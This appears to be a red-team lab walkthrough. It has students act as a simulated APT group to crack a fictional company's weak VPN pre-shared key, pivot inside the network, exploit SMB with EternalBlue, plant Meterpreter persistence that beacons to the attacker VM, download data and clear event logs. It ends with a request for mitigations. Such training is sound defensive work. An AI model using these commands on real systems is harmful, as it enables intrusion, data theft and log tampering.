# VPN Tunnel Pivot

Objective: Act as an APT actor (`APT-62`, "Shadow Wire") to discover, compromise, and leverage a misconfigured site-to-site VPN tunnel to gain initial access to a secured internal network. Establish persistence and exfiltrate data.

Scenario: [OpenHands International](entity.md) uses an IPSec VPN tunnel to connect its HQ to a remote branch office. The tunnel is established, but a weak pre-shared key (PSK) and permissive firewall rules within the tunnel create an opportunity for pivot and lateral movement.

## Phase 1: Reconnaissance & VPN Discovery

Goal: Discover the VPN gateway and identify the VPN technology and potential weaknesses.

Instructions:

1.  Access Your Foothold:
    *   SSH into your assigned Kali Linux attacker VM. This VM is on the simulated "internet".
    *   Command: `ssh root@<attacker_vm_ip>`
    *   Password: `[Provided by Lab Instructor]`

2.  Discover the VPN Endpoint:
    *   Perform a port scan against the OpenHands HQ network range provided by your instructor. Look for common VPN ports.
    *   Command: `nmap -sS -p 500,4500,1194,943,8443 <hq_network_range>`
    *   Finding: Which IP address has port `500/udp` open? This is the standard port for IKE (Internet Key Exchange), used by IPSec VPNs.
    *   VPN_GATEWAY_IP: `[DISCOVER THIS]`

3.  Fingerprint the VPN Service:
    *   Use a tool like `ike-scan` to interrogate the VPN gateway and discover its vendor and supported encryption methods.
    *   Command: `ike-scan -A -M <VPN_GATEWAY_IP>`
    *   Finding: What is the vendor ID (e.g., `Cisco`, `StrongSwan`) and what weak transformation sets (e.g., `3des-sha1-modp1024`) does it support?
    *   Vendor: `[DISCOVER THIS]`
    *   Weak Proposal: `[DISCOVER THIS]`

Checkpoint: You have identified the VPN concentrator and confirmed it supports weak cryptographic algorithms. Proceed to the next phase.

## Phase 2: VPN Weakness Exploitation

Goal: Crack the VPN pre-shared key to gain access to the tunnel.

Instructions:

1.  Perform a PSK Brute-Force Attack:
    *   The `ike-scan` tool can be used to perform a brute-force attack against the IKE handshake using a provided wordlist of common PSKs.
    *   Command: `ike-scan -A -M <VPN_GATEWAY_IP> --pskcrack --auth=3 --id=mygroup`
        *   *Note: The `--id` value might need to be discovered or is often set to a group name. Try common names like `vpn`, `group`, or the company name if this step fails.*
    *   This command will capture the IKE handshake hashes.

2.  Crack the Captured Hash:
    *   `ike-scan` will save the hash to a file (e.g., `pskkey.txt`). Use `psk-crack` with the provided wordlist to crack the key.
    *   Command: `psk-crack -d /usr/share/wordlists/rockyou.txt pskkey.txt`
    *   Finding: What is the cracked Pre-Shared Key?
    *   VPN_PSK: `[DISCOVER THIS]`

3.  Configure VPN Access:
    *   Your Kali VM has VPN client software pre-installed. Configure a new connection using the details you've gathered.
    *   Settings:
        *   Gateway: `<VPN_GATEWAY_IP>`
        *   Type: IPSec (IKEv1) with PSK
        *   Group/ID: `mygroup` (or the one you discovered)
        *   Secret: `<VPN_PSK>`
        *   Phase1 Algorithms: `3des-sha1-modp1024` (the weak one you found)
        *   Phase2 Algorithms: `aes128-sha1`
    *   Command to connect: `sudo systemctl start strongswan` or use the GUI network manager.

4.  Verify Connection:
    *   Check that you have received a new IP address on the `tun0` interface. This is your IP inside the VPN tunnel.
    *   Command: `ip addr show tun0`
    *   Your VPN IP: `[DISCOVER THIS]`

Checkpoint: You are now connected to the OpenHands internal network via the VPN tunnel. You have successfully bypassed the perimeter firewall.

## Phase 3: Internal Pivot & Lateral Movement

Goal: Explore the network you now have access to and find a high-value target.

Instructions:

1.  Discover the VPN Subnet:
    *   Your VPN IP is likely on a dedicated subnet for remote users (e.g., `10.10.20.0/24`). Discover what other networks are reachable.
    *   Command: `netdiscover -i tun0 -r <vpn_subnet>/24` (e.g., `-r 10.10.20.0/24`)

2.  Map Accessible Internal Networks:
    *   Check the routing table provided to your VPN adapter. You might have routes to other, more sensitive subnets.
    *   Command: `ip route show`
    *   Finding: What internal corporate subnet is listed in the routing table? (e.g., `192.168.100.0/24` via `10.10.20.1`).
    *   INTERNAL_NET: `[DISCOVER THIS]`

3.  Scan the Internal Network:
    *   Perform a targeted port scan on the `INTERNAL_NET` to find live hosts and services. Be stealthy.
    *   Command: `nmap -sn -T2 <INTERNAL_NET>`
    *   Finding: Identify the IP address of a server that responds. Note it as `TARGET_SERVER`.

4.  Enumerate the Target:
    *   Perform a detailed scan on the `TARGET_SERVER` to find potential entry points.
    *   Command: `nmap -sV -sC -O -p- <TARGET_SERVER>`
    *   Finding: What services are running? Note any that seem vulnerable (e.g., `SMB`, ` outdated HTTP`, `RDP`).
    *   Open Ports/Services: `[LIST THEM HERE]`

Checkpoint: You have mapped the internal network and identified a potential target server for further exploitation.

## Phase 4: Establishing a Foothold and Persistence

Goal: Exploit a service on the internal server to gain a shell and create a persistent backdoor.

Instructions:

1.  Exploit the Service:
    *   Based on your findings from the previous step, choose an exploit.
    *   Example: If you found SMB with a known vulnerability (e.g., EternalBlue), use `msfconsole` to launch the exploit.
    *   Metasploit Commands:
        ```bash
        msf6 > use exploit/windows/smb/ms17_010_eternalblue
        msf6 exploit(...) > set RHOSTS <TARGET_SERVER>
        msf6 exploit(...) > run
        ```
    *   Success: You should receive a `meterpreter` shell.

2.  Establish Persistence:
    *   Once you have a shell, create a persistent backdoor so you can re-enter the network even if the VPN connection drops.
    *   Meterpreter Command: `run persistence -U -i 60 -p 443 -r <YOUR_ATTACKER_VM_IP>`
    *   This creates a scheduled task that will call back to your Kali box every 60 seconds.

3.  Exfiltrate Simulated Data:
    *   Search the target server for files containing simulated sensitive data.
    *   Meterpreter Commands:
        ```bash
        search -f *password*.txt
        search -f *volunteer*.xlsx
        download C:\\Users\\Admin\\Documents\\dummy_data.xlsx
        ```
    *   Finding: What is the name of the file you exfiltrated?
    *   Filename: `[DISCOVER THIS]`

Checkpoint: You have compromised an internal server, established a persistent beacon, and successfully exfiltrated data.

## Phase 5: Covering Tracks (Optional Bonus)

Goal: Remove evidence of your initial VPN connection and internal activity.

Instructions:

1.  Disconnect the VPN: Cleanly disconnect your Kali VM from the IPSec VPN.
2.  Clear Logs on Target Server: From your Meterpreter session, attempt to clear the Windows Event Logs.
    *   Command: `run event_manager -c`
3.  Operate from Your Backdoor: Wait for your persistent agent to call back to your Kali machine. Now you have access without the VPN, which is much stealthier.

Final Report: Document all the `[DISCOVER THIS]` fields. Write a brief analysis on the critical misconfigurations that allowed this attack to succeed (e.g., weak PSK, permissive VPN routing, vulnerable internal services) and provide one mitigation strategy for each.